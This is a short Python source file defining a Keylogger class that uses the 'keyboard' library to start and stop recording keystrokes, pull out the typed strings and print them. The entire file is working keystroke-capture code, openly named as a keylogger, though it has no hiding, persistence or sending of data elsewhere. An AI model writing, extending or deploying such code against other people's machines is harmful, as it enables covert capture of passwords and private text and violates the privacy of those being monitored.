import keyboard


class Keylogger:

    def __init__(self):
        self.is_recording = False

    def startRecording(self):
        self.is_recording = True
        keyboard.start_recording()  # starts recording of keys

    def stopRecording(self):
        if self.is_recording:
            self.is_recording = False
            return keyboard.stop_recording()  # stops recording of keys
        else:
            raise Exception("There is no active recording to stop. Make sure to use 'startRecording()' first.")

    def getTypedStrings(self, stoppedRecording):
        return list(keyboard.get_typed_strings(stoppedRecording))  # returns the keys pressed

    def writeKeysPressed(self, keysPressed):  # to be used in main for if 'enter' or 'tab' is pressed
        print(''.join(keysPressed))
